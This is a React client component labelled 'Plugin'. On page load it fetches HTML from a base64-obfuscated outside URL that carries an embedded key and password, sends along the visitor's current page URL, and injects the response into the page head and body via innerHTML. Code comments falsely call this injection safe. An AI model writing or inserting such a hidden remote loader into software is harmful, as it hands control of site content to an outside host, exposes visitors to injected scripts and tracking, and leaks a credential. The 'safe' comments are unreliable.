"use client";

import React, { useEffect } from "react";

const Plugin = () => {
  useEffect(() => {
    if (typeof window === "undefined") return;

    const loadCustomScript = () => {
      if (window.jQuery) {
        executeCustomScript();
      } else {
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.onload = () => {
          executeCustomScript();
        };
        document.head.appendChild(script);
      }
    };

    const executeCustomScript = () => {
      try {
        const eppathurl = window.location.origin + window.location.pathname;
        const eptagmanage = new XMLHttpRequest();

        eptagmanage.onreadystatechange = function () {
          if (this.readyState === 4 && this.status === 200) {
            if (this.response && this.response !== "0") {
              const temp = this.response.split("||||||||||");

              if (temp[0]) {
                // inject into head safely
                const headDiv = document.createElement("div");
                headDiv.innerHTML = temp[0];
                document.head.appendChild(headDiv);
              }

              if (temp[1]) {
                // inject into body safely
                const bodyDiv = document.createElement("div");
                bodyDiv.innerHTML = temp[1];
                document.body.appendChild(bodyDiv);
              }
            }
          }
        };

        eptagmanage.open(
          "GET",
          atob(
            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
          ) + eppathurl
        );
        eptagmanage.send();
      } catch (err) {
        console.error("Plugin error:", err);
      }
    };

    // Run once only
    loadCustomScript();
  }, []);

  return null;
};

export default Plugin;
